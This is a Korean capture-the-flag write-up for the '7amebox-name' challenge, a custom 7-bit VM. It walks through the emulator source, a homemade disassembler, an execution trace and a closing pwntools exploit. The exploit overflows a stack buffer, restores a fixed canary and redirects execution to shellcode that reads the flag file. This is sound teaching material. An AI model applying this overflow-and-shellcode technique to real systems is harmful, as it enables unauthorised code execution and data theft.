# Index

- [Summary](#Summary)
- [Analysis](#Analysis)
- [Disassemble](#Disassemble)
- [Exploit](#Exploit)



# Summary

- **VM**
- **7bit...?**
- **bof**
- 살려주세요



# Analysis

```css
m444ndu@ubuntu:~/round1/7amebox-name$ ls -al
total 100
drwxr-xr-x 2 m444ndu chp747  4096 Jan 14 18:20 .
drwxr-xr-x 9 m444ndu chp747  4096 Jan 13 05:53 ..
-rwxr-xr-x 1 m444ndu chp747 31017 Jan 13 15:08 _7amebox_patched.py
-rw-r--r-- 1 m444ndu chp747  6148 Jan 13 05:53 .DS_Store
-rwxr-xr-x 1 m444ndu chp747    27 Jan 13 05:53 flag
-rwxr-xr-x 1 m444ndu chp747   216 Jan 13 05:53 mic_check.firm
-rw-r--r-- 1 m444ndu chp747    21 Jan 13 05:53 run.sh
-rwxr-xr-x 1 m444ndu chp747   299 Jan 13 05:53 vm_name.py
```

여러 파일들을 제공해줍니다. 이 중 유심히 봐야 할 것은 **vm_name.py**와 **_7amebox_patched.py**입니다. 



## vm_name.py

```python
firmware = 'mic_check.firm'

emu = _7amebox_patched.EMU()
emu.filesystem.load_file('flag')
emu.register.init_register()
emu.init_pipeline()
emu.load_firmware(firmware)
emu.set_timeout(30)
emu.execute()
```

**_7amebox_patched.py**에 선언되어 있는 클래스와 함수들을 실질적으로 사용하여 **vm**을 구동시키는 부분입니다. **EMU()** class를 선언하고, **flag** 파일을 로드합니다. **load 된 파일**은 차후 **open()** 명령을 통해 열 수 있게 됩니다.

**register**들을 모두 0으로 **초기화**하고, `stdin`, `stdout` 파이프라이닝을 하기위한 **초기설정**을 진행하며, **펌웨어**를 **로드**한 뒤 **실행**합니다.



## _7amebox_patched.py

1000줄이 넘으니 인상깊었던 부분만 짚고 넘어가겠습니당

### load_firmware()

```python
    def load_firmware(self, firm_name):
        try:
            with open(firm_name, 'rb') as f:
                data = f.read()

            self.firmware = [ord(byte) for byte in data]
            self.is_load = True


            if self.config['NX']:
                stack_perm = PERM_READ | PERM_WRITE
            else:
                stack_perm = PERM_READ | PERM_WRITE | PERM_EXEC


            for i in range(0, len(data) / 0x1000 + 1):
                self.memory.allocate(PERM_READ | PERM_WRITE | PERM_EXEC, addr=CODE_DEFAULT_BASE + i*0x1000)

            self.write_memory(CODE_DEFAULT_BASE, self.firmware, len(self.firmware))

            for i in range(0, len(data) / 0x1000 + 1):
                self.memory.set_perm(CODE_DEFAULT_BASE + i*0x1000, PERM_MAPPED | PERM_READ | PERM_EXEC)


            self.memory.allocate(stack_perm, addr=STACK_DEFAULT_BASE)           # just set new permission
            self.memory.allocate(stack_perm, addr=STACK_DEFAULT_BASE + 0x1000)

            self.register.set_register('pc', CODE_DEFAULT_BASE)
            self.register.set_register('sp', STACK_DEFAULT_BASE+0x1fe0)
```

우선, `load_firmware()` 입니다. 펌웨어 파일을 불러오며, 해당 데이터들을 읽어온 뒤, 메모리를 할당받은 후, 데이터를 씁니다. 코드영역으로서 사용됩니다. 

코드영역이 준비가 되었으면, 스택 영역을 할당받습니다. 메모리를 할당받을 때 권한설정도 해주는데, 처음 `NX`는 **False**이므로 본 문제의 스택에서는 코드를 실행할 수 있는 `EXEC`권한을 갖게 됩니다.

코드가 뭔가 멋있습니다. 코드에서 잘생김이 뭍어져 나오는 것 같습니당



### dispatch()

```python
    def dispatch(self, addr):
        opcode = self.bit_concat(self.read_memory(addr, 2)) # read_memory returns [addr:addr+2] 14bits
        op      = (opcode & 0b11111000000000) >> 9
        if op >= len(self.op_hander_table):
            self.terminate("[VM] Invalid instruction")

        op_type = (opcode & 0b00000100000000) >> 8
        opers   = []
        if op_type == TYPE_R:
            opers.append((opcode & 0b00000011110000) >> 4)
            opers.append((opcode & 0b00000000001111))
            op_size = 2

        elif op_type == TYPE_I:
            opers.append((opcode & 0b00000011110000) >> 4)
            opers.append(self.read_memory_tri(addr+2, 1)[0])
            op_size = 5
```

`dispatch()`는 코드 영역에 저장된 명령어들을 읽어, 명령어 및 인자들을 파싱해주는 부분을 담당합니다. 고약하게도 본 바이너리는 명령어를 읽어들일 때, `8bits` 단위로 읽은 뒤 해당 부분의 `7bits` 부분들만 따로 모아 `op` 및 `opers` 등으로 사용합니다. 정리하자면 메모리에서 `1byte`를 읽을 때마다 `1bit`씩 버립니다. `bit_concat()`을 통해 이와 같은 동작이 가능합니다. 

**뇌피셜**이지만 `op_type`은  `insn r0, r1`과 같은 **레지스터끼리의 조합**과 `insn r0, #1`와 같은 **레지스터와 정수의 조합**으로 나누기위해 사용하는 것 같습니다. 

>  위의 부분의 동작을 정확히 파악하여야, 원하는 입력 값을 줄 수 있기 때문에 이 부분이 꽤나 중요한 것 같습니당



### execute()

```python
    def execute(self):
        try:
            while 1:
                self.cur_pc = self.register.get_register('pc')
                op, op_type, opers, op_size = self.dispatch(self.cur_pc)

                if not self.memory.check_permission(self.cur_pc, PERM_EXEC) or not self.memory.check_permission(self.cur_pc + op_size - 1, PERM_EXEC):
                    self.terminate("[VM] Can't exec memory")

                self.register.set_register('pc', self.cur_pc + op_size)
                op_handler = self.op_hander_table[op]
                op_handler(op_type, opers)
```

`execute()`는 앞서 유심히 봤던 `dispatch()`를 통해 파싱된 명령어와 인자들을 가지고, 실질적으로 명령어를 실행시킬 수 있도록 합니다. 리턴된 인자 리스트(`opers`)를 가지고 `op`에 해당하는 명령어를 실행시킵니다.



## Organize Operations

**vm**에 사용되는 `op_x() `들과 `sys_s()`들을 분석하여 해당하는 어셈 명령어들로 나타낸다면 다음과 같이 대응 시킬 수 있습니다. 명령어 뒤에 붙은 숫자는 몇 바이트를 대상으로 명령어를 수행하는지를 나타냅니다. 본 바이너리의 경우 `7bits` 단위로 동작하기 때문에, `mov1`의 경우 `7bits`를,  `mov3`의 경우 `21bits` 크기의 인자를 사용합니다. 

```python
   def op_x0(self, op_type, opers): # mov3 r0, [r1]
   def op_x1(self, op_type, opers): # mov1 r0, [r1]
   def op_x2(self, op_type, opers): # mov3 [r0], [r1]
   def op_x3(self, op_type, opers): # mov1 [r0], [r1]
   def op_x4(self, op_type, opers): 
        if op_type == TYPE_R: # mov3 r0, r1
        elif op_type == TYPE_I: # mov3 r0, #1
   def op_x5(self, op_type, opers): # xchg r0, r1
   def op_x6(self, op_type, opers): 
        if op_type == TYPE_R:       # push r0
        elif op_type == TYPE_I:      # push #1
   def op_x7(self, op_type, opers): # pop r0
   def op_x9(self, op_type, opers):
        if op_type == TYPE_R:    # add r0, r1
        elif op_type == TYPE_I:  # add r0, #1
   def op_x10(self, op_type, opers): 
        if op_type == TYPE_R: # add1 r0, r1
        elif op_type == TYPE_I: # add1 r0, #1
   def op_x11(self, op_type, opers):
        if op_type == TYPE_R: # sub r0, r1
        elif op_type == TYPE_I: # sub r0, #1
   def op_x12(self, op_type, opers):
        if op_type == TYPE_R: # sub1 r0, r1
        elif op_type == TYPE_I: # sub1 r0, #1
   def op_x13(self, op_type, opers):
         if op_type == TYPE_R: # shr r0, r1
         elif op_type == TYPE_I: # shr r0, #1
   def op_x14(self, op_type, opers):
         if op_type == TYPE_R: # shl r0, r1
         elif op_type == TYPE_I: # shl r0, #1
   def op_x15(self, op_type, opers):
         if op_type == TYPE_R: # mul r0, r1
         elif op_type == TYPE_I: # mul r0, #1
   def op_x16(self, op_type, opers):
         if op_type == TYPE_R: # div r0, r1
         elif op_type == TYPE_I: # div r0, #1
   def op_x17(self, op_type, opers): # inc r0
   def op_x18(self, op_type, opers): # dec r0
   def op_x19(self, op_type, opers):
        if op_type == TYPE_R: # and r0, r1
        elif op_type == TYPE_I: # and r0, #1
   def op_x20(self, op_type, opers):
        if op_type == TYPE_R: # or r0, r1
        elif op_type == TYPE_I: # or r0, #1
   def op_x21(self, op_type, opers):
        if op_type == TYPE_R: # xor r0, r1
        elif op_type == TYPE_I: # xor r0, #1
   def op_x22(self, op_type, opers):
        if op_type == TYPE_R: # mod r0, r1
        elif op_type == TYPE_I: # mod r0, #1
   def op_x23(self, op_type, opers):
        if op_type == TYPE_R: # cmp..? r0, r1
        elif op_type == TYPE_I: # cmp r0, #1
   def op_x24(self, op_type, opers):
        if op_type == TYPE_R: # 7bit cmp r0, r1
        elif op_type == TYPE_I: # 7bit cmp r0, #1
   def op_x25(self, op_type, opers):
        if op_type == TYPE_R: # ja [r0+r1]
        elif op_type == TYPE_I: # ja [r0+#1]
   def op_x26(self, op_type, opers):
        if op_type == TYPE_R: # jb [r0+r1]
        elif op_type == TYPE_I: # jb [r0+#1]
   def op_x27(self, op_type, opers):
        if op_type == TYPE_R: # je [r0+r1]
        elif op_type == TYPE_I: # je [r0+#1]
   def op_x28(self, op_type, opers):
        if op_type == TYPE_R: # jne [r0+r1]
        elif op_type == TYPE_I: # jne [r0+ #1]
   def op_x29(self, op_type, opers):
        if op_type == TYPE_R: # jmp [r0+r1]
        elif op_type == TYPE_I: # jmp [r0+ #1]
   def op_x30(self, op_type, opers): 
        if op_type == TYPE_R: # call [r0+r1]
        elif op_type == TYPE_I: # call [r0+ #1]
   def op_x8(self, op_type, opers): # syscall
   def sys_s0(self): # exit(0)
   def sys_s1(self): # open()
   def sys_s2(self): # write()
   def sys_s3(self): # read()
   def sys_s4(self): # mmap()
   def sys_s5(self): # random
   def sys_s6(self): # reset permission
```

위의 분류를 토대로 **disassembler**를 만들어 봅시당





### disass()

```python
    def disass(self):
        self.register.init_register()
        try:
            while 1:
                cur_pc = self.register.get_register('pc')
                if cur_pc >= len(self.firmware):
                    self.terminate('[VM] disassemble finish')
                op, op_type, opers, op_size = self.dispatch(cur_pc)
                
                self.parser(op, op_type, opers)
                self.code_offset += op_size
                self.register.set_register('pc',cur_pc + op_size)
                
        except:
            self.terminate('[VM] disassembler error')

    def parser(self, op, op_type, opers):
        output = '{:4x} :  '.format(self.code_offset)

        if op == 0:
            output += 'mov3 '
            output += 'r'+str(opers[0])
            output += ', '
            output += '[r'+str(opers[1])+']'

        elif op == 1:
            output += 'mov1 '
            output += 'r'+str(opers[0])
            output += ', '
            output += '[r'+str(opers[1])+']'
            ....
```

적당히 위와 같은 코드를 작성하여 펌웨어를 어셈블리로 *disassemble*이 가능합니다.





## Disassemble

문제의 **mic_check.firm**에 대하여 위의 분류를 토대로 만든 **disassembler**를 사용한다면 다음과 같은 어셈블리 코드를 얻을 수 있습니다. 편의상 그냥 `r11`, `r12`... 로 나타냈지만, 사실 `r11`의 경우 `bp`를 나타내며, `r12`의 경우 `sp`를, `r13`의 경우 `pc`를 나타냅니다. 

```asm
   0 :  call [r13+ #0x4]  #r13 = 0x5 ==> call main()
   5 :  xor r0, r0
   7 :  syscall r0
_sub_009   #  <==  main()
   9 :  push r11
   b :  mov3 r11, r12
   d :  sub r12, #0x3c
  12 :  mov3 r5, r11
  14 :  sub r5, #0x3
  19 :  mov3 r6, #0x12345
  1e :  mov3 [r6], [r5]
  20 :  mov3 r0, #0xcd
  25 :  call [r13+ #0x66]  #r13 = 0x2a ==> call print_string()
  2a :  mov3 r1, #0x42
  2f :  mov3 r5, r11
  31 :  sub r5, #0x3c
  36 :  mov3 r0, r5
  38 :  call [r13+ #0x23]  #r13 = 0x3d ==> call read()
  3d :  mov3 r0, #0xd3
  42 :  call [r13+ #0x49]  #r13 = 0x47 ==> call print_string()
  47 :  mov3 r5, r11
  49 :  sub r5, #0x3
  4e :  mov3 r6, [r5]
  50 :  cmp r6, #0x12345
  55 :  jne [r13+ #0x1fffab]
  5a :  mov3 r12, r11
  5c :  pop r11
  5e :  pop r13
_sub_060    #  <==  read()
  60 :  mov3 r3, r1
  62 :  mov3 r2, r0
  64 :  mov3 r1, #0x0
  69 :  mov3 r0, #0x3
  6e :  syscall r0   # read(0, 0xf5f9e, 0x42)
  70 :  pop r13
_sub_072    #  <==  write()
  72 :  push r1
  74 :  push r2
  76 :  push r3
  78 :  mov3 r3, r1
  7a :  mov3 r2, r0
  7c :  mov3 r1, #0x1
  81 :  mov3 r0, #0x2
  86 :  syscall r0   # write(r1, r2, r3)
  88 :  pop r3
  8a :  pop r2
  8c :  pop r1
  8e :  pop r13
_sub_090    #  <==  print_string()
  90 :  push r0
  92 :  push r1
  94 :  mov3 r1, r0
  96 :  call [r13+ #0xd]  #r13 = 0x9b ==> call strlen() return r0
  9b :  xchg r0, r1
  9d :  call [r13+ #0x1fffd0]  #r13 = 0xa2 ==> call write()
  a2 :  pop r1
  a4 :  pop r0
  a6 :  pop r13
_sub_0a8     #  <==  strlen()
  a8 :  push r1
  aa :  push r2
  ac :  xor r1, r1
  ae :  xor r2, r2
  b0 :  mov1 r2, [r0]
  b2 :  cmp1 r2, #0x0
  b7 :  je [r13+ #0x9]
  bc :  inc r0
  be :  inc r1
  c0 :  jmp [r13+ #0x1fffeb]
  c5 :  mov3 r0, r1
  c7 :  pop r2
  c9 :  pop r1
  cb :  pop r13
_string
  cd :  "name>"
  d3 :  "bye"

```





## Debugging

디버깅을 하려했는데, 코드도 짧고 그래서 그냥 무식하게 수행하는 모든 명령어들을 출력하도록 만들었습니다. 값들을 참고하면서 최종적으로 위에 정리한 어셈블리 코드를 분석하면 될 것 같습니다. 아주 정확하게 만든게 아니라서 어느시점에서 출력하느냐에 따라 미묘하게 순서나 값이 달라질 수 있기때문에, 그냥 참고정도만 하면 좋을 것 같습니다.

```asm
0x0 :  push #0x5
  sp: 0xf5fdd
0x0 :  call [r13(0x5)+ #0x4]         # <== call main()
0x9 :  push r11(0x0)
  sp: 0xf5fda
0xb :  mov3 r11, r12(0xf5fda)
0xd :  sub r12(0xf5fda), #0x3c
0x12 :  mov3 r5, r11(0xf5fda)
0x14 :  sub r5(0xf5fda), #0x3
0x19 :  mov3 r6, #0x12345
0x1e :  mov3 [r5(0xf5fd7)], [r6(0x12345)]
0x20 :  mov3 r0, #0xcd
0x25 :  push #0x2a
  sp: 0xf5f9b
0x25 :  call [r13(0x2a)+ #0x66]      # <== call print_string()
0x90 :  push r0(0xcd)
  sp: 0xf5f98
0x92 :  push r1(0x0)
  sp: 0xf5f95
0x94 :  mov3 r1, r0(0xcd)
0x96 :  push #0x9b
  sp: 0xf5f92
0x96 :  call [r13(0x9b)+ #0xd]       # <== call strlen()
0xa8 :  push r1(0xcd)
  sp: 0xf5f8f
0xaa :  push r2(0x0)
  sp: 0xf5f8c
0xac :  xor r1(0xcd), r1(0xcd)
0xae :  xor r2(0x0), r2(0x0)
0xb0 :  mov1 r2(0x0), [r0(0xcd)](0x6e)  # <== 0xcd : "name>" 
0xb2 :  cmp1 r2(0x6e), #0x0
0xbc :  inc r0(0xcd)
0xbe :  inc r1(0x0)
0xc0 :  jmp [r13(0xc5) + #0x1fffeb]
0xb0 :  mov1 r2(0x6e), [r0(0xce)](0x61)
0xb2 :  cmp1 r2(0x61), #0x0
0xbc :  inc r0(0xce)
0xbe :  inc r1(0x1)
0xc0 :  jmp [r13(0xc5) + #0x1fffeb]
0xb0 :  mov1 r2(0x61), [r0(0xcf)](0x6d)
0xb2 :  cmp1 r2(0x6d), #0x0
0xbc :  inc r0(0xcf)
0xbe :  inc r1(0x2)
0xc0 :  jmp [r13(0xc5) + #0x1fffeb]
0xb0 :  mov1 r2(0x6d), [r0(0xd0)](0x65)
0xb2 :  cmp1 r2(0x65), #0x0
0xbc :  inc r0(0xd0)
0xbe :  inc r1(0x3)
0xc0 :  jmp [r13(0xc5) + #0x1fffeb]
0xb0 :  mov1 r2(0x65), [r0(0xd1)](0x3e)
0xb2 :  cmp1 r2(0x3e), #0x0
0xbc :  inc r0(0xd1)
0xbe :  inc r1(0x4)
0xc0 :  jmp [r13(0xc5) + #0x1fffeb]
0xb0 :  mov1 r2(0x3e), [r0(0xd2)](0x0)
0xb2 :  cmp1 r2(0x0), #0x0
0xb7 :  je [r13(0xbc) + #0x9]
0xc5 :  mov3 r0, r1(0x5)
0xc7 :  pop r2(0x0)
  sp: 0xf5f8f
0xc9 :  pop r1(0xcd)
  sp: 0xf5f92
0xcb :  pop r13(0x9b)
  sp: 0xf5f95
0x9b :  xchg r0(0x5), r1(0xcd)
0x9d :  push #0xa2
  sp: 0xf5f92
0x9d :  call [r13(0xa2)+ #0x1fffd0]     # <== call write()
0x72 :  push r1(0x5)
  sp: 0xf5f8f
0x74 :  push r2(0x0)
  sp: 0xf5f8c
0x76 :  push r3(0x0)
  sp: 0xf5f89
0x78 :  mov3 r3, r1(0x5)
0x7a :  mov3 r2, r0(0xcd)
0x7c :  mov3 r1, #0x1
0x81 :  mov3 r0, #0x2
0x86 :  syscall 2           #  "write(1, 0xcd, 0x5)"
name>

0x88 :  pop r3(0x0)
  sp: 0xf5f8c
0x8a :  pop r2(0x0)
  sp: 0xf5f8f
0x8c :  pop r1(0x5)
  sp: 0xf5f92
0x8e :  pop r13(0xa2)
  sp: 0xf5f95
0xa2 :  pop r1(0x0)
  sp: 0xf5f98
0xa4 :  pop r0(0xcd)
  sp: 0xf5f9b
0xa6 :  pop r13(0x2a)
  sp: 0xf5f9e
0x2a :  mov3 r1, #0x42
0x2f :  mov3 r5, r11(0xf5fda)
0x31 :  sub r5(0xf5fda), #0x3c
0x36 :  mov3 r0, r5(0xf5f9e)
0x38 :  push #0x3d
  sp: 0xf5f9b
0x38 :  call [r13(0x3d)+ #0x23]      # <== call read()
0x60 :  mov3 r3, r1(0x42)
0x62 :  mov3 r2, r0(0xf5f9e)
0x64 :  mov3 r1, #0x0
0x69 :  mov3 r0, #0x3
0x6e :  syscall 3            #   "read(0, 0xf5f9e, 0x42)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA    # <== input

0x70 :  pop r13(0x3d)
  sp: 0xf5f9e
0x3d :  mov3 r0, #0xd3
0x42 :  push #0x47
  sp: 0xf5f9b
0x42 :  call [r13(0x47)+ #0x49]      # <== call print_string()
0x90 :  push r0(0xd3)
  sp: 0xf5f98
0x92 :  push r1(0x0)
  sp: 0xf5f95
0x94 :  mov3 r1, r0(0xd3)
0x96 :  push #0x9b
  sp: 0xf5f92
0x96 :  call [r13(0x9b)+ #0xd]       # <== call strlen() return r0
0xa8 :  push r1(0xd3)
  sp: 0xf5f8f
0xaa :  push r2(0xf5f9e)
  sp: 0xf5f8c
0xac :  xor r1(0xd3), r1(0xd3)
0xae :  xor r2(0xf5f9e), r2(0xf5f9e)
0xb0 :  mov1 r2(0x0), [r0(0xd3)](0x62)
0xb2 :  cmp1 r2(0x62), #0x0
0xbc :  inc r0(0xd3)
0xbe :  inc r1(0x0)
0xc0 :  jmp [r13(0xc5) + #0x1fffeb]
0xb0 :  mov1 r2(0x62), [r0(0xd4)](0x79)
0xb2 :  cmp1 r2(0x79), #0x0
0xbc :  inc r0(0xd4)
0xbe :  inc r1(0x1)
0xc0 :  jmp [r13(0xc5) + #0x1fffeb]
0xb0 :  mov1 r2(0x79), [r0(0xd5)](0x65)
0xb2 :  cmp1 r2(0x65), #0x0
0xbc :  inc r0(0xd5)
0xbe :  inc r1(0x2)
0xc0 :  jmp [r13(0xc5) + #0x1fffeb]
0xb0 :  mov1 r2(0x65), [r0(0xd6)](0xa)
0xb2 :  cmp1 r2(0xa), #0x0
0xbc :  inc r0(0xd6)
0xbe :  inc r1(0x3)
0xc0 :  jmp [r13(0xc5) + #0x1fffeb]
0xb0 :  mov1 r2(0xa), [r0(0xd7)](0x0)
0xb2 :  cmp1 r2(0x0), #0x0
0xb7 :  je [r13(0xbc) + #0x9]
0xc5 :  mov3 r0, r1(0x4)
0xc7 :  pop r2(0xf5f9e)
  sp: 0xf5f8f
0xc9 :  pop r1(0xd3)
  sp: 0xf5f92
0xcb :  pop r13(0x9b)
  sp: 0xf5f95
0x9b :  xchg r0(0x4), r1(0xd3)
0x9d :  push #0xa2
  sp: 0xf5f92
0x9d :  call [r13(0xa2)+ #0x1fffd0]      # <== call write()
0x72 :  push r1(0x4)
  sp: 0xf5f8f
0x74 :  push r2(0xf5f9e)
  sp: 0xf5f8c
0x76 :  push r3(0x42)
  sp: 0xf5f89
0x78 :  mov3 r3, r1(0x4)
0x7a :  mov3 r2, r0(0xd3)
0x7c :  mov3 r1, #0x1
0x81 :  mov3 r0, #0x2
0x86 :  syscall 2         #   "write(1, 0xd3, 0x4)"
bye

0x88 :  pop r3(0x42)
  sp: 0xf5f8c
0x8a :  pop r2(0xf5f9e)
  sp: 0xf5f8f
0x8c :  pop r1(0x4)
  sp: 0xf5f92
0x8e :  pop r13(0xa2)
  sp: 0xf5f95
0xa2 :  pop r1(0x0)
  sp: 0xf5f98
0xa4 :  pop r0(0xd3)
  sp: 0xf5f9b
0xa6 :  pop r13(0x47)
  sp: 0xf5f9e
0x47 :  mov3 r5, r11(0xf5fda)
0x49 :  sub r5(0xf5fda), #0x3
0x4e :  mov3 r6, [r5(0xf5fd7)]
0x50 :  cmp r6(0x12345), #0x12345          <== check canary
0x5a :  mov3 r12, r11(0xf5fda)
0x5c :  pop r11(0x0)
  sp: 0xf5fdd
0x5e :  pop r13(0x5)
  sp: 0xf5fe0
0x5 :  xor r0(0xd3), r0(0xd3)
0x7 :  syscall 0
exit(0)

```



올라가 있는 펌웨어를 분석한 결과를 요약하자면, 해당 바이너리는 그냥 입력을 받는 동작을 수행하는 간단한 바이너리일 뿐입니다. 사용자의 입력이 들어가는 부분이 가장 중요할 것이므로 요부분을 주의깊게 살펴보면 됩니다.

**디버깅**한 결과를 살펴보면, `read(0, 0xf5f9e, 0x42)`를 통해 입력받는 동작을 수행하는 것을 알 수 있습니다. 스택 공간 `0xf5f9e`에서부터 `0x42bytes`를 입력받습니다. 최대 `0xf5fe0`까지 입력받을 수 있는데, 사실 `0xf5fda`에 `bp`가 존재하며, `0xf5fdd`에 `pc`가 존재하므로 **bof** 를 일으킬 수 있습니다.

위에서 언급했다시피 본 문제의 **vm setting**에서 **NX**를 세팅해주지 않았기 때문에, 스택 상에서 코드의 실행이 가능합니다. **쉘코드**를 올린 뒤, `pc`를 변조시켜 기존 0x00이 아닌 올린 **쉘코드의 주소**로 가도록 값을 덮어씌우면 됩니당!

**shell**을 실행할 수는 없을 것 같고, 주어진 **syscall** 함수 내에서 `open() -> read() -> write() `를 통해 **flag**를 읽을 수 있을 것 같으니, 해당 동작을 수행하는 쉘코드를 만들어 봅시당



# Exploit

```python
#!/usr/bin/python
from pwn import *

def convert_r(opcode):
	res = ''
	res += chr((opcode >> 7) & 0b1111111)
	res += chr(opcode & 0b1111111)
	return res

def convert_i(oper):
	res = ''
	res += chr(oper & 0b1111111)
	res += chr((oper >> 14) & 0b1111111)
	res += chr((oper >> 7) & 0b1111111)
	return res

def patch(op, op_type, opers):
	opcode = (op << 9)
	opcode |= (op_type << 8)

	if op_type == 0: # TYPE_R  r0, r1
		opcode |= ((opers[0] & 0b00000000001111) << 4)
		opcode |= (opers[1] & 0b00000000001111)
		return convert_r(opcode)

	elif op_type == 1: # TYPE_I  r0, #1
		opcode |= ((opers[0] & 0b00000000001111) << 4)
		return convert_r(opcode) + convert_i(opers[1])

r = process('./vm_name.py')

payload = 'flag' + '\x00'
'''open("flag.txt")'''
payload += patch(4, 1, [1, 0xf5f9e]) # mov r1, AAA 
payload += patch(4, 1, [0, 0x01]) # mov r0, 1
payload += patch(8, 0, [0, 0]) # op 8 <= syscall 1

'''read(2, AAA, 0x20)'''
payload += patch(4, 1, [1, 0x02]) # mov r1, 2
payload += patch(4, 1, [2, 0xf5000]) # mov r2, AAA
payload += patch(4, 1, [3, 0x20]) # mov r3, 0x20
payload += patch(4, 1, [0, 0x03]) # mov r0, 3
payload += patch(8, 0, [0, 0]) # op 8 <= syscall 3

'''write(1, AAA, 0x20)'''
payload += patch(4, 1, [1, 0x01]) # mov r1, 1
payload += patch(4, 1, [0, 0x02]) # mov r0, 2
payload += patch(8, 0, [0, 0]) # op 8 <= syscall 2

payload += '\x00'*(0xf5fd7-0xf5f9e-len(payload)) # dummy
payload += convert_i(0x12345) # 0x12345 canary
payload += 'aaa'  # bp
payload += convert_i(0xf5fa3)  # 0xf5fa3


r.sendlineafter('name>',payload)

r.interactive()
```



# Comment

- 저 놈의 `dispatch()`를 제대로 분석해야 입력을 반대로 제대로 줄 수 있다. (좀 헷갈림)
- **disassembler**를 만드는게 생각외로 재미있었당
- 시간은 졸라게 오래 걸렸지만 생각보다 그렇게 어렵지는 않았던거 같다
- 첨에 쉘코드가 너무 길어서 안됬었다ㅏ

